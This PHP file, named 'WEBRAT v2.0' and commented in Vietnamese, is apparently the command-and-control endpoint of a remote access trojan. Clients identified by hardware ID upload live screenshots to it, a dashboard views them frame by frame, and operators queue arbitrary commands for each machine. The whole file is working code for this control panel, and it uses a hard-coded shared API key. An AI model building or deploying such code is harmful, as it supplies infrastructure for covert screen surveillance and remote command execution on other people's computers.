<?php
// =============================================================
//  WEBRAT v2.0 - Dedicated Endpoint cho Remote Desktop (60 FPS 1080p Ultra Fast)
// =============================================================

ini_set('memory_limit', '256M');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Api-Key');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

require_once __DIR__ . '/db.php';
define('CLIENT_API_KEY', 'WEBRAT_SECRET_KEY_2026');

function jsonOk($data = [], $msg = 'OK') {
    echo json_encode(['status' => 'ok', 'message' => $msg, 'data' => $data], JSON_UNESCAPED_UNICODE);
    exit;
}
function jsonErr($msg = 'Error', $code = 400) {
    http_response_code($code);
    echo json_encode(['status' => 'error', 'message' => $msg], JSON_UNESCAPED_UNICODE);
    exit;
}
function requireApiKey() {
    $key = $_SERVER['HTTP_X_API_KEY'] ?? $_GET['key'] ?? $_POST['key'] ?? '';
    if ($key !== CLIENT_API_KEY) {
        jsonErr('INVALID_API_KEY', 403);
    }
}
function requireDashboardAuth() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    if (!isset($_SESSION['webrat_user'])) {
        jsonErr('NOT_AUTHENTICATED', 401);
    }
    // Đóng khóa Session ngay lập tức để tránh blocking các request polling 60 FPS song song
    session_write_close();
}
function getJsonBody(): array {
    $raw = file_get_contents('php://input');
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

try {
    $db = getDB();
    
    // Tự động tạo/cập nhật bảng hỗ trợ 60 FPS & độ phân giải cao
    $db->exec("CREATE TABLE IF NOT EXISTS `commands` (
      `id`          INT AUTO_INCREMENT PRIMARY KEY,
      `client_id`   VARCHAR(20) NOT NULL,
      `command`     TEXT NOT NULL,
      `result`      TEXT,
      `status`      ENUM('pending','done','error') DEFAULT 'pending',
      `created_at`  DATETIME DEFAULT CURRENT_TIMESTAMP,
      `executed_at` DATETIME DEFAULT NULL,
      INDEX idx_client_status (`client_id`, `status`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

    $db->exec("CREATE TABLE IF NOT EXISTS `screenshots_live` (
      `id`          INT AUTO_INCREMENT PRIMARY KEY,
      `client_id`   VARCHAR(20) NOT NULL,
      `hwid`        VARCHAR(64) DEFAULT '',
      `image_b64`   MEDIUMTEXT,
      `width`       INT DEFAULT 0,
      `height`      INT DEFAULT 0,
      `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
      UNIQUE KEY uniq_client (`client_id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

    // Hàng đợi khung hình FIFO không làm mất bất kỳ frame nào
    $db->exec("CREATE TABLE IF NOT EXISTS `screenshots_queue` (
      `id`          BIGINT AUTO_INCREMENT PRIMARY KEY,
      `client_id`   VARCHAR(20) NOT NULL,
      `hwid`        VARCHAR(64) DEFAULT '',
      `image_b64`   MEDIUMTEXT,
      `width`       INT DEFAULT 0,
      `height`      INT DEFAULT 0,
      `captured_at` DATETIME DEFAULT CURRENT_TIMESTAMP,
      INDEX idx_client_id (`client_id`, `id`)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");
    
} catch (Exception $e) {
    jsonErr('DATABASE_CONNECTION_FAILED: ' . $e->getMessage(), 500);
}

$action = $_GET['action'] ?? $_POST['action'] ?? '';

switch ($action) {
    case 'upload_screenshot':
        requireApiKey();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        $hwid     = trim($data['hwid'] ?? '');
        $imgB64   = $data['image'] ?? '';
        $width    = (int)($data['width'] ?? 0);
        $height   = (int)($data['height'] ?? 0);

        if ($clientId === '' || $imgB64 === '') jsonErr('MISSING_DATA');
        try {
            // ═════════════════════════════════════════════════════════════
            // LUỒNG 1: GIẢI NÉN & KIỂM TRA HÌNH DẠNG GỐC CỦA KHUNG HÌNH (DECOMPRESS & DECODE)
            // ═════════════════════════════════════════════════════════════
            $rawDecoded = base64_decode($imgB64, true);
            if ($rawDecoded === false || strlen($rawDecoded) < 10) {
                jsonErr('INVALID_IMAGE_PAYLOAD', 400);
            }
            // Kiểm tra Magic Header JPEG (\xFF\xD8\xFF) để đảm bảo hình ảnh giải nén đúng định dạng
            $isJpeg = (substr($rawDecoded, 0, 3) === "\xFF\xD8\xFF");
            if (!$isJpeg) {
                // Nếu là mã hóa PNG hoặc khác, kiểm tra header PNG (\x89PNG)
                $isPng = (substr($rawDecoded, 0, 4) === "\x89PNG");
                if (!$isPng) {
                    jsonErr('CORRUPTED_FRAME_HEADER', 400);
                }
            }

            // ═════════════════════════════════════════════════════════════
            // LUỒNG 2: TỐI ƯU LƯU TRỮ DATABASE & TRUY XUẤT SIÊU TỐC
            // ═════════════════════════════════════════════════════════════
            // 1. Thực thi lưu siêu tốc vào hàng đợi FIFO với Index tối ưu
            $db->prepare("
                INSERT INTO screenshots_queue (client_id, hwid, image_b64, width, height, captured_at)
                VALUES (?, ?, ?, ?, ?, NOW())
            ")->execute([$clientId, $hwid, $imgB64, $width, $height]);

            // 2. Đồng bộ bảng screenshots_live cho hiển thị trực tiếp tức thì
            $db->prepare("
                INSERT INTO screenshots_live (client_id, hwid, image_b64, width, height, captured_at)
                VALUES (?, ?, ?, ?, ?, NOW())
                ON DUPLICATE KEY UPDATE hwid=VALUES(hwid), image_b64=VALUES(image_b64),
                    width=VALUES(width), height=VALUES(height), captured_at=NOW()
            ")->execute([$clientId, $hwid, $imgB64, $width, $height]);

            // 3. Tự động dọn dẹp hàng đợi cũ theo xác suất 1/10 request để tránh phình dung lượng CSDL
            // Chỉ giữ lại 50 frames gần nhất cho mỗi client
            if (rand(1, 10) === 1) {
                $db->prepare("
                    DELETE FROM screenshots_queue
                    WHERE client_id = ? AND id NOT IN (
                        SELECT id FROM (
                            SELECT id FROM screenshots_queue
                            WHERE client_id = ?
                            ORDER BY id DESC
                            LIMIT 50
                        ) AS keeper
                    )
                ")->execute([$clientId, $clientId]);
            }

            jsonOk([], 'SCREENSHOT_SAVED');
        } catch (Exception $e) {
            jsonErr('SCREENSHOT_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'get_screenshot':
        requireDashboardAuth();
        $clientId = trim($_GET['client_id'] ?? '');
        $lastId   = (int)($_GET['last_id'] ?? 0);

        if ($clientId === '') jsonErr('MISSING_CLIENT_ID');
        try {
            // ═════════════════════════════════════════════════════════════
            // LUỒNG VẼ & TRUY XUẤT DATABASE ĐƯỢC TỐI ƯU HÓA (RENDER & HIGH-SPEED DB FETCH)
            // ═════════════════════════════════════════════════════════════
            if ($lastId > 0) {
                // Truy xuất danh sách khung hình mượt mà từ hàng đợi FIFO qua Index
                // Giới hạn 20 frames mỗi lần để tránh timeout
                $stmt = $db->prepare("
                    SELECT id, image_b64, width, height, captured_at
                    FROM screenshots_queue
                    WHERE client_id = ? AND id > ?
                    ORDER BY id ASC
                    LIMIT 20
                ");
                $stmt->execute([$clientId, $lastId]);
                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

                $resultFrames = [];
                foreach ($rows as $r) {
                    $resultFrames[] = [
                        'id'          => (int)$r['id'],
                        'image'       => $r['image_b64'],
                        'width'       => (int)$r['width'],
                        'height'      => (int)$r['height'],
                        'captured_at' => $r['captured_at'],
                    ];
                }
                jsonOk(['frames' => $resultFrames]);
            } else {
                // Truy xuất 1 khung hình mới nhất để hiển thị vẽ ngay lập tức
                $stmt = $db->prepare("
                    SELECT id, image_b64, width, height, captured_at
                    FROM screenshots_live
                    WHERE client_id = ?
                    LIMIT 1
                ");
                $stmt->execute([$clientId]);
                $row = $stmt->fetch();
                if ($row) {
                    jsonOk([
                        'frames' => [[
                            'id'          => (int)$row['id'],
                            'image'       => $row['image_b64'],
                            'width'       => (int)$row['width'],
                            'height'      => (int)$row['height'],
                            'captured_at' => $row['captured_at'],
                        ]]
                    ]);
                } else {
                    jsonOk(['frames' => []]);
                }
            }
        } catch (Exception $e) {
            jsonErr('GET_SCREENSHOT_ERROR: ' . $e->getMessage(), 500);
        }
        break;

    case 'send_command':
        requireDashboardAuth();
        $data = getJsonBody();
        $clientId = trim($data['client_id'] ?? '');
        $cmd      = trim($data['command'] ?? '');
        if ($clientId === '' || $cmd === '') jsonErr('MISSING_DATA');
        try {
            $stmt = $db->prepare("INSERT INTO commands (client_id, command, status) VALUES (?, ?, 'pending')");
            $stmt->execute([$clientId, $cmd]);
            $cmdId = $db->lastInsertId();
            jsonOk(['command_id' => $cmdId], 'COMMAND_QUEUED');
        } catch (Exception $e) { jsonErr('COMMAND_SEND_ERROR', 500); }
        break;

    default:
        jsonErr('UNKNOWN_ACTION_IN_DESKTOP', 400);
}
?>